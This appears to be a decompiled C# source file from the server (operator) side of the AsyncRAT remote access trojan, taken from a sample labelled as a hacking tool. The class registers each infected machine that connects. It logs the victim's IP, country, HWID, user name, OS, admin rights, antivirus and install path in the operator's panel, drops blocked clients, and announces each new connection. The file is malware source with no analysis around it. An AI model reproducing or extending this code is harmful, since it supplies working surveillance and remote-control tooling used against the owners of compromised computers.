// Decompiled with JetBrains decompiler
// Type: Server.Handle_Packet.HandleListView
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Connection;
using Server.MessagePack;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
  public class HandleListView
  {
    public void AddToListview(Clients client, MsgPack unpack_msgpack)
    {
      try
      {
        lock (Server.Settings.LockBlocked)
        {
          try
          {
            if (Server.Settings.Blocked.Count > 0)
            {
              if (Server.Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
              {
                client.Disconnected();
                return;
              }
              if (Server.Settings.Blocked.Contains(client.Ip))
              {
                client.Disconnected();
                return;
              }
            }
          }
          catch
          {
          }
        }
        client.LV = new ListViewItem()
        {
          Tag = (object) client,
          Text = string.Format("{0}:{1}", (object) client.Ip, (object) client.TcpClient.LocalEndPoint.ToString().Split(':')[1])
        };
        try
        {
          string[] strArray = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
          client.LV.SubItems.Add(strArray[1]);
          try
          {
            client.LV.ImageKey = strArray[2] + ".png";
          }
          catch
          {
          }
        }
        catch
        {
          client.LV.SubItems.Add("??");
        }
        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
        try
        {
          client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Installed").AsString).ToLocalTime().ToString());
        }
        catch
        {
          try
          {
            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Installed").AsString);
          }
          catch
          {
            client.LV.SubItems.Add("??");
          }
        }
        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Antivirus").AsString);
        client.LV.SubItems.Add("0000 MS");
        try
        {
          client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
        }
        catch
        {
          client.LV.SubItems.Add("...");
        }
        client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
        ListViewItem lv = client.LV;
        lv.ToolTipText = lv.ToolTipText + "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;
        client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
        client.LV.UseItemStyleForSubItems = false;
        Program.form1.Invoke((Delegate) (() =>
        {
          lock (Server.Settings.LockListviewClients)
          {
            Program.form1.listView1.Items.Add(client.LV);
            Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            Program.form1.lv_act.Width = 500;
          }
          if (Server.Properties.Settings.Default.Notification)
          {
            Program.form1.notifyIcon1.BalloonTipText = "Connected \r\n" + client.Ip + " : " + client.TcpClient.LocalEndPoint.ToString().Split(':')[1];
            Program.form1.notifyIcon1.ShowBalloonTip(100);
          }
          new HandleLogs().Addmsg("Client " + client.Ip + " connected", Color.Green);
        }));
      }
      catch
      {
      }
    }

    public void Received(Clients client)
    {
      try
      {
        lock (Server.Settings.LockListviewClients)
        {
          if (client.LV == null)
            return;
          client.LV.ForeColor = Color.Empty;
        }
      }
      catch
      {
      }
    }
  }
}
